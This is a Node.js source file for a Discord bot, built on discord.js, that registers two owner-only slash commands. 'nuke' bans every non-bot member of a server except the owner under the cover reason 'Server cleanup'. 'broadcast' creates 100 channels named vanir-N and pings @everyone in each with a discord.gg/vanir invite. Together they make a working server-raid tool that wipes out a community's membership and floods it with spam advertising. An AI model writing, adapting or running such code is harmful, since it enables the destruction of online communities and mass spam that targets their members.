const { 
  Client, 
  GatewayIntentBits, 
  Partials, 
  SlashCommandBuilder, 
  REST, 
  Routes, 
  PermissionFlagsBits, 
  ChannelType 
} = require('discord.js');
require('dotenv').config();

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers],
  partials: [Partials.GuildMember],
});

const bannedUsers = new Set();

client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);

  const commands = [
    new SlashCommandBuilder()
      .setName('nuke')
      .setDescription('Ban all members except owner (DANGEROUS)')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON(),
    new SlashCommandBuilder()
      .setName('broadcast')
      .setDescription('Create 100 channels and ping @everyone with discord.gg/vanir')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
      .toJSON()
  ];

  const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
  await rest.put(
    Routes.applicationGuildCommands(client.user.id, process.env.GUILD_ID),
    { body: commands }
  );

  console.log('🚀 Slash commands registered');
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  const guild = interaction.guild;

  if (interaction.commandName === 'nuke') {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({ content: '❌ You are not allowed to use this command.', ephemeral: true });
    }

    await interaction.reply('⚠️ Confirm nuke? Type `CONFIRM` within 15 seconds.');

    const filter = m => m.author.id === interaction.user.id && m.content === 'CONFIRM';
    try {
      const collected = await interaction.channel.awaitMessages({ filter, max: 1, time: 15000, errors: ['time'] });
      const members = await guild.members.fetch();

      for (const [id, member] of members) {
        if (id === process.env.OWNER_ID || member.user.bot) continue;

        try {
          if (!bannedUsers.has(id)) {
            await member.ban({ reason: 'Server cleanup' });
            bannedUsers.add(id);
            console.log(`Banned ${member.user.tag}`);
          }
        } catch (err) {
          console.error(`Failed to ban ${member.user.tag}: ${err.message}`);
        }
      }

      interaction.followUp('✅ Nuke complete.');
    } catch {
      interaction.followUp('❌ Nuke canceled or timed out.');
    }
  }

  if (interaction.commandName === 'broadcast') {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({ content: '❌ You are not allowed to use this command.', ephemeral: true });
    }

    await interaction.reply('🚧 Starting channel creation...');

    for (let i = 1; i <= 100; i++) {
      try {
        const channel = await guild.channels.create({
          name: `vanir-${i}`,
          type: ChannelType.GuildText,
          permissionOverwrites: [
            {
              id: guild.roles.everyone.id,
              allow: ['ViewChannel', 'SendMessages'],
            },
          ],
        });

        await channel.send({
          content: `@everyone https://discord.gg/vanir`,
          allowedMentions: { parse: ['everyone'] }
        });

        console.log(`✅ Created channel vanir-${i}`);
        await new Promise(r => setTimeout(r, 500)); // Slight delay to reduce rate limit risk
      } catch (err) {
        console.error(`❌ Failed to create or send in vanir-${i}: ${err.message}`);
      }
    }

    interaction.followUp('✅ Broadcast complete.');
  }
});

client.login(process.env.TOKEN);
